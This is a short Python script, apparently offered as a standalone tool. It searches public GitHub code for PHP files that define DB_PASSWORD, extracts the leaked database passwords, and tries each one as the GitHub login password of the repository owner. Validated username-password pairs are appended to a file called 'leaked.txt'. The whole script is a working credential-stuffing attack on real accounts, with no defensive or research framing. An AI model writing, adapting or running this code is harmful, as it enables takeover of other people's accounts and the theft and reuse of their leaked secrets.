#!/usr/bin/env python3

import ast
import itertools
import json
import os
import re
import requests
import sys
import time
from typing import Callable, Iterable, TextIO, Tuple

API = 'https://api.github.com'
ENV_VAR = 'GITHUB_TOKEN'
HEADERS = {
    'Authorization': 'token ' + os.environ.get(ENV_VAR, ''),
    'Accept': 'application/vnd.github.v3.text-match+json',
}


def validate_login(*auth: Tuple[str, str]) -> bool:
    'Try to login with the username and password.'
    r = requests.get(API, auth=auth)
    return r.status_code == 200


def search_code(keywords: str) -> Iterable[dict]:
    'Search across all the public repositories.'
    for i in itertools.count():
        params = dict(q=keywords, page=i)
        r = requests.get(API + '/search/code', params, headers=HEADERS)
        items = json.loads(r.text)['items']
        if items:
            yield from items
        else:
            return


def credential_stuffing(keywords: str, find: Callable, pause=60) -> Iterable:
    'Test leaked credentials on GitHub.'
    tried_passwords = set()

    for document in search_code(keywords):
        user = document['repository']['owner']['login']

        for match in document['text_matches']:
            password = find(match['fragment'])
            if not password or password in tried_passwords:
                continue

            tried_passwords.add(password)
            if validate_login(user, password):
                progress('#')
                yield user, password
                break
            else:
                progress()
                time.sleep(pause)


def progress(dot='.', file=sys.stdout):
    'Print a progress bar.'
    file.write(dot)
    file.flush()


def find_php_constants(code: str) -> Iterable[Tuple[str, str]]:
    'Extract constant definitions from the code snippet.'
    PATTERN = r'define\s*(\(.+?,.+?\));'
    for match in re.finditer(PATTERN, code):
        try:
            yield ast.literal_eval(match.group(1))
        except:
            pass


def find_php_db_password(code: str) -> str:
    'Extract the database password from the code snippet.'
    passwords = set()
    others = set()
    for k, v in find_php_constants(code):
        (passwords if 'PASSWORD' in k else others).add(v)
    for password in passwords:
        if not any(i for i in others if password in i or i in password):
            return password


def main(patterns: Iterable[Tuple], file: TextIO):
    'Print validated credentials.'
    if ENV_VAR not in os.environ:
        print('Please provide your %s as an environment variable.' % ENV_VAR)
        return

    for pattern in patterns:
        for user, password in credential_stuffing(*pattern):
            print(user, password, file=file)


if __name__ == '__main__':
    path = sys.argv[1] if len(sys.argv) > 1 else 'leaked.txt'
    patterns = {
        'define DB_PASSWORD': find_php_db_password,
    }
    with open(path, 'a') as f:
        main(patterns.items(), f)
